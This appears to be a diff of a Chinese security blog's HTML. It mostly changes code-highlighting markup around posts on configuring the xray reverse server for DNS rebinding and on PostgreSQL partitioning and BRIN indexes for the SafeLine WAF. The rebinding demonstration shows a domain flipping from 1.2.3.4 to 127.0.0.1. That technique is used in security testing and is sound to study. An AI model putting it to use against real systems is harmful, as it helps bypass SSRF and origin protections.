     &lt;span class=&quot;c1&quot;&gt;# dns rebinding 返回的 ip 是动态的&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 示例配置文件的中的 localhost 是演示使用的，我们添加 ns1 和 ns2 的 A 记录&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns1&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns2&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;140.143.224.171&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns1&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns2&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;140.143.224.171&quot;&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 其他的项目没有修改 ...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./xray reverse&lt;/code&gt; 启动，这时候可以看到提示信息多了一些，&lt;code class=&quot;highlighter-rouge&quot;&gt;dns server&lt;/code&gt; 也启动了。&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 10:20:16 +0800 [default:config.go:160] loading config from config.yaml
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 10:20:16 +0800 [default:config.go:160] loading config from config.yaml
 reverse server base url: http://140.143.224.171:4445, token: imtoken1
 reverse server webUI: http://140.143.224.171:4445/cland/
 [DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
 [DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:52] reverse dns started
 [INFO] 2019-09-08 10:20:16 +0800 [reverse:dns_server.go:167] starting reverse dns server
 [INFO] 2019-09-08 10:20:16 +0800 [reverse:http_server.go:118] starting reverse http server
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;要注意的是 dns 服务需要监听 UDP 53 端口，需要 root 权限而且记得在防火墙中放行。&lt;/p&gt;
 
@@ -455,12 +438,12 @@ reverse server webUI: http://140.143.224.171:4445/cland/
 
 &lt;p&gt;回到界面上，点击 &lt;code class=&quot;highlighter-rouge&quot;&gt;生成一个域名&lt;/code&gt;，我们先来验证一下之前的配置有没有生效，因为 ns 记录大概需要几个小时才能全球生效，当然如果指定了 dns 服务器为自己的的话，就不需要了。&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; ns1.revc.xyz A @140.143.224.171
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; ns1.revc.xyz A @140.143.224.171
 
-; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; ns1.revc.xyz A @140.143.224.171
-;; global options: +cmd
-;; Got answer:
-;; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;sh&quot;&gt;&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 852
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.10.6 &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ns1.revc.xyz A @140.143.224.171
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 852
 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 ;; WARNING: recursion requested but not available
 
@@ -474,8 +457,7 @@ ns1.revc.xyz.		60	IN	A	140.143.224.171
 ;; SERVER: 140.143.224.171#53(140.143.224.171)
 ;; WHEN: Sun Sep 08 10:22:23 CST 2019
 ;; MSG SIZE  rcvd: 58
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;可以看出来 ns1 的解析记录是对的，这个是我们配置文件中的静态解析规则。&lt;/p&gt;
 
@@ -493,12 +475,12 @@ ns1.revc.xyz.		60	IN	A	140.143.224.171
 
 &lt;p&gt;点击保存之后，同样是先本地测试一下。&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; p-04f887-2kua.revc.xyz A @140.143.224.171
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; p-04f887-2kua.revc.xyz A @140.143.224.171
 
-; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; p-04f887-2kua.revc.xyz A @140.143.224.171
-;; global options: +cmd
-;; Got answer:
-;; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;sh&quot;&gt;&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 35
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.10.6 &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; p-04f887-2kua.revc.xyz A @140.143.224.171
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 35
 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 ;; WARNING: recursion requested but not available
 
@@ -515,7 +497,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	1.2.3.4
 
 
 
-$dig p-04f887-2kua.revc.xyz A @140.143.224.171
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; p-04f887-2kua.revc.xyz A @140.143.224.171
 
 ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; p-04f887-2kua.revc.xyz A @140.143.224.171
 ;; global options: +cmd
@@ -534,8 +516,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 ;; SERVER: 140.143.224.171#53(140.143.224.171)
 ;; WHEN: Sun Sep 08 10:29:29 CST 2019
 ;; MSG SIZE  rcvd: 78
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;可以看出来第一次和第二次的解析结果是不一样的，将 DNS 服务器更换为 &lt;code class=&quot;highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt; 可以得到相同的结果。&lt;/p&gt;
 
@@ -681,20 +662,18 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 
 &lt;p&gt;在 Django 中，数据的核心是 model，所以只要给 model 加上我们的 decorator 就可以在 migrate 的时候声明为分区表了。&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@TimeRangePartitioningSupport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;timestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@TimeRangePartitioningSupport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;timestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AttackLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DateTimeField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;rule_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;……&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;但是这个时候只有主表没有子表，需要再去扫描所有的 model 然后创建或者归档子表。&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;detach_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;雷池的分区自动创建和归档是通过后端的定时器来触发上面的 API 实现的。&lt;/p&gt;
 
@@ -710,45 +689,40 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 
 &lt;p&gt;创建数据表，只含有一个 id 字段&lt;/p&gt;
 
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;数据表大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;3.4G&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dt+ example
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dt+ example
                       List of relations
  Schema |  Name   | Type  |  Owner   |  Size   | Description
 --------+---------+-------+----------+---------+-------------
  public | example | table | safeline | 3457 MB |
 (1 row)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;创建索引&lt;/p&gt;
 
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INDEX&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pages_per_range&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autosummarize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INDEX&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pages_per_range&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autosummarize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;索引大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;56K&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx
                         List of relations
  Schema | Name | Type  |  Owner   |  Table  | Size  | Description
 --------+------+-------+----------+---------+-------+-------------
  public | idx  | index | safeline | example | 56 kB |
 (1 row)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;explain 一下 BRIN 索引使用情况&lt;/p&gt;
 
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;EXPLAIN&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ANALYZE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;492167&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;EXPLAIN&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ANALYZE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;492167&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                                           QUERY PLAN
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                                           QUERY PLAN
 --------------------------------------------------------------------------------------------------------------------------------
  Gather  (cost=1016.26..807981.92 rows=1 width=4) (actual time=12.700..86.880 rows=1 loops=1)
    Workers Planned: 2
@@ -762,23 +736,20 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
  Planning Time: 0.318 ms
  Execution Time: 86.950 ms
 (11 rows)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;索引很小，尝试使用 B-Tree 索引，体积会是 &lt;code class=&quot;highlighter-rouge&quot;&gt;2.1G&lt;/code&gt;，大约是数据本身的三分之二大小了。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create index idx_btree on example (id);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create index idx_btree on example (id);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx_btree
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx_btree
                             List of relations
  Schema |   Name    | Type  |  Owner   |  Table  |  Size   | Description
 --------+-----------+-------+----------+---------+---------+-------------
  public | idx_btree | index | safeline | example | 2142 MB |
 (1 row)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;brin-索引结构&quot;&gt;BRIN 索引结构&lt;/h2&gt;
 
@@ -788,14 +759,13 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 
 &lt;p&gt;第一页 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 保存 BRIN 索引的元数据&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from brin_metapage_info(get_raw_page('idx', 0));
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from brin_metapage_info(get_raw_page('idx', 0));
 
    magic    | version | pagesperrange | lastrevmappage
 ------------+---------+---------------+----------------
